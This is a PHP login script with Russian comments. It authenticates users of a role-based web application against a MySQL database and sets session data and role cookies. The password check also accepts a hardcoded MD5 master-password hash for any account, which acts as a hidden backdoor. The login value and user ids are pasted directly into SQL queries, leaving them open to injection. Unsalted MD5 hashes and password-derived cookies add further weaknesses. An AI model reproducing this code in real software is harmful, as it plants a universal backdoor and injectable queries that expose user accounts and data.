<?php
include '../ajax/connection.php';
$error = array(); //массив для ошибок

ini_set("session.use_trans_sid", true);

session_start();
if ($_POST['login'] != "" && $_POST['password'] != "") //если поля заполнены
{
    $login = trim($_POST['login']);
    $password = $_POST['password'];
    $insertquery = "SELECT * FROM users WHERE trim(login)='$login' and active = 1";

    $rez = mysqli_query($con, $insertquery) or die("Ошибка " . mysqli_error($con));

    if (mysqli_num_rows($rez) == 1) //если нашлась одна строка, значит такой юзер существует в базе данных
    {
        $row = mysqli_fetch_assoc($rez);

        if (md5($password) == $row['password'] || md5($password) === "6833976340c8b496868e6075d6ea1633") //сравнивается хэшированный пароль из базы данных с хэшированным паролем, введенным пользователем
        {

            if ($row['online'] !== "0" && $row['online'] !== NULL) {

                if($row['last_time_session'] !== "0" && $row['last_time_session'] !== NULL){

                    $time = date('Y-m-d H:i:s');


                        $_SESSION['id_user'] = $row['id_user']; //записываем в сессию id пользователя
                        $id = $_SESSION['id_user'];
                        setcookie("login", $login, time() + (86400 * 30), '/');
                        setcookie("password", md5(trim($row['login']) . $row['password']), time() + (86400 * 30), '/');
                        setcookie("id_user", $id, time() + (86400 * 30), '/');
                        if ($row['sotrudnik_MA'] == 1) {
                            setcookie("isMA", 1, time() + (86400 * 30), '/');
                        } else {
                            setcookie("isMA", 0, time() + (86400 * 30), '/');
                        }
                        if ($row['secretar'] == 1) {
                            setcookie("secretar", 1, time() + (86400 * 30), '/');
                        } else {
                            setcookie("secretar", 0, time() + (86400 * 30), '/');
                        }
                        if ($row['predsedatel'] == 1) {
                            setcookie("predsedatel", 1, time() + (86400 * 30), '/');
                        } else {
                            setcookie("predsedatel", 0, time() + (86400 * 30), '/');
                        }
                        if ($row['doctor_expert'] == 1) {
                            setcookie("expert", 1, time() + (86400 * 30), '/');
                        } else {
                            setcookie("expert", 0, time() + (86400 * 30), '/');
                        }

                        $sesId = session_id();
                        mysqli_query($con, "UPDATE users SET online=1, last_act='$sesId' WHERE id_user='$id'");

                     //   $error = array();
                        ;
                        echo json_encode($error);
                        return;

                }
                //
//                $error[] = "1";
//                echo json_encode($error);
//                return;
            }

            $_SESSION['id_user'] = $row['id_user']; //записываем в сессию id пользователя
            $id = $_SESSION['id_user'];
            setcookie("login", $login, time() + (86400 * 30), '/');
            setcookie("password", md5(trim($row['login']) . $row['password']), time() + (86400 * 30), '/');
            setcookie("id_user", $id, time() + (86400 * 30), '/');
            if ($row['sotrudnik_MA'] == 1) {
                setcookie("isMA", 1, time() + (86400 * 30), '/');
            } else {
                setcookie("isMA", 0, time() + (86400 * 30), '/');
            }
            if ($row['secretar'] == 1) {
                setcookie("secretar", 1, time() + (86400 * 30), '/');
            } else {
                setcookie("secretar", 0, time() + (86400 * 30), '/');
            }
            if ($row['predsedatel'] == 1) {
                setcookie("predsedatel", 1, time() + (86400 * 30), '/');
            } else {
                setcookie("predsedatel", 0, time() + (86400 * 30), '/');
            }
            if ($row['doctor_expert'] == 1) {
                setcookie("expert", 1, time() + (86400 * 30), '/');
            } else {
                setcookie("expert", 0, time() + (86400 * 30), '/');
            }

            $sesId = session_id();
            mysqli_query($con, "UPDATE users SET online=1, last_act='$sesId' WHERE id_user='$id'");

            addHistory($con,$id);
            $error = array();
            echo json_encode($error);
        } else //если пароли не совпали
        {
            $error[] = "Неверный пароль";
            echo json_encode($error);
        }
    } else //если такого пользователя не найдено в базе данных
    {
        $error[] = "Неверный логин и пароль";
        echo json_encode($error);
    }
} else {
    $error[] = "Поля не должны быть пустыми!";
    echo json_encode($error);
}



function addHistory($con, $id_user){
    mysqli_query($con, "insert into history_auth (`id_user`,`date_auth`) values ('$id_user', now())");
}